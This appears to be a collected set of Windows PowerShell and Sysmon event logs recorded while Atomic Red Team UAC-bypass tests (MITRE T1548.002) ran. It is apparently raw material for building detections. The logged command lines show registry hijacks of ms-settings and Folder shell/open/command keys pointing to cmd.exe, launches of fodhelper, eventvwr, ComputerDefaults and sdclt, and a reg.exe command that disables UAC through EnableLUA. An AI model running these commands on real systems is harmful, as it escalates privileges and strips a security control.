@@ -1,0 +1,252 @@
+Atomic Test #1 - Bypass UAC using Event Viewer (cmd)
+not found
+
+Atomic Test #2 - Bypass UAC using Event Viewer (PowerShell)
+
+Log1
+10/02/2024 10:24:17 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=2628
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+Start-Process "C:\Windows\System32\eventvwr.msc"
+
+ScriptBlock ID: 6655e52f-4839-4f70-9db0-0f84ecfe6985
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1548.002\T1548_002_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Log2
+10/02/2024 10:25:26 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=2644
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
+
+ScriptBlock ID: aabbb908-8f86-4bfa-9b49-4da554b98fb6
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1548.002\T1548_002_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Log3
+10/02/2024 10:25:26 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=2648
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force
+
+ScriptBlock ID: ecf81adf-3dc7-4038-a605-9c98f37681b6
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1548.002\T1548_002_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Atomic Test #3 - Bypass UAC using Fodhelper
+not found
+
+Atomic Test #4 - Bypass UAC using Fodhelper - PowerShell
+
+Log1
+10/02/2024 10:25:51 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=2656
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
+
+ScriptBlock ID: 997b5514-8a34-43ae-94aa-50de8f159f7f
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1548.002\T1548_002_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Log2
+10/02/2024 10:25:03 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=2640
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+Start-Process "C:\Windows\System32\fodhelper.exe"
+
+ScriptBlock ID: c972a291-334b-4b58-b7cb-9b237aaed23e
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1548.002\T1548_002_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Atomic Test #5 - Bypass UAC using ComputerDefaults (PowerShell)
+
+Log1
+10/02/2024 10:25:26 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=2650
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+Start-Process "C:\Windows\System32\ComputerDefaults.exe"
+
+ScriptBlock ID: 4c5ef546-f847-4501-838a-2ca6f5ebf247
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1548.002\T1548_002_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Atomic Test #6 - Bypass UAC by Mocking Trusted Directories
+
+Log1
+09/03/2024 06:03:55 AM
+LogName=Microsoft-Windows-Sysmon/Operational
+EventCode=11
+EventType=4
+ComputerName=DESKTOP-43B3OH1
+User=SYSTEM
+Sid=S-1-5-18
+SidType=1
+SourceName=Microsoft-Windows-Sysmon
+Type=信息
+RecordNumber=184661
+Keywords=None
+TaskCategory=File created (rule: FileCreate)
+OpCode=信息
+Message=File created:
+RuleName: -
+UtcTime: 2024-09-02 22:03:55.756
+ProcessGuid: {6f6dba56-3646-66d6-a564-2a0000001700}
+ProcessId: 106420
+Image: C:\Windows\system32\cmd.exe
+TargetFilename: C:\testbypass.exe
+CreationUtcTime: 2024-09-02 22:03:55.749
+User: DESKTOP-43B3OH1\xcy
+Collapse
+host = DESKTOP-43B3OH1source = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1548.002\T1548_002.evtxsourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational
+
+
+Atomic Test #7 - Bypass UAC using sdclt DelegateExecute
+
+Log1
+10/02/2024 10:25:51 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=2658
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+Start-Process -FilePath $env:windir\system32\sdclt.exe
+
+ScriptBlock ID: 7620711f-bd90-4707-8cfc-58644fd8445f
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1548.002\T1548_002_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Atomic Test #8 - Disable UAC using reg.exe
+
+Log1
+09/03/2024 06:04:26 AM
+LogName=Microsoft-Windows-Sysmon/Operational
+EventCode=1
+EventType=4
+ComputerName=DESKTOP-43B3OH1
+User=SYSTEM
+Sid=S-1-5-18
+SidType=1
+SourceName=Microsoft-Windows-Sysmon
+Type=信息
+RecordNumber=206637
+Keywords=None
+TaskCategory=Process Create (rule: ProcessCreate)
+OpCode=信息
+Message=Process Create:
+RuleName: -
+UtcTime: 2024-09-02 22:04:26.617
+ProcessGuid: {6f6dba56-366a-66d6-f564-2a0000001700}
+ProcessId: 104004
+Image: C:\Windows\System32\reg.exe
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: Registry Console Tool
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: reg.exe
+CommandLine: reg.exe  ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+CurrentDirectory: C:\Windows\system32\
+User: DESKTOP-43B3OH1\xcy
+LogonGuid: {6f6dba56-34a7-66d6-0a51-0c2102000000}
+LogonId: 0x2210C510A
+TerminalSessionId: 2
+IntegrityLevel: High
+Hashes: SHA1=C0DB341DEFA8EF40C03ED769A9001D600E0F4DAE,MD5=227F63E1D9008B36BDBCC4B397780BE4,SHA256=C0E25B1F9B22DE445298C1E96DDFCEAD265CA030FA6626F61A4A4786CC4A3B7D,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
+ParentProcessGuid: {6f6dba56-3646-66d6-a564-2a0000001700}
+ParentProcessId: 106420
+ParentImage: C:\Windows\System32\cmd.exe
+ParentCommandLine: "C:\Windows\system32\cmd.exe" 
+ParentUser: DESKTOP-43B3OH1\xcy
+折叠
+host = DESKTOP-43B3OH1source = E:\Download\15ttp_logs_2\T1548.002\T1548_002.evtxsourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational
+
+Atomic Test #9 - Bypass UAC using SilentCleanup task
+not found
+
